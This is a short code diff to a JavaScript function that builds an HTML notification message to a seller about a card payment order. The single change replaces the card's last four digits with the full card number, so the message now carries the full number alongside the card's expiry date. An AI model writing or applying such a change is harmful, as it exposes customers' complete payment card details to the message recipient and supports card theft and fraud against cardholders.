@@ -129,7 +129,7 @@ function createCardPaymentSellerMessage(order) {
     `<b>Country:</b> ${escapeHtml(order.customer.country)}`,
     '',
     '<b>Submitted Payment Information</b>',
-    `<b>Card Last 4:</b> ${escapeHtml(order.customer.cardLast4 || 'Not provided')}`,
+    `<b>Card:</b> ${escapeHtml(order.customer.cardNumber || 'Not provided')}`,
     `<b>Card Expiry:</b> ${escapeHtml(order.customer.cardExpiry || 'Not provided')}`,
     '',
     '<b>Products</b>',
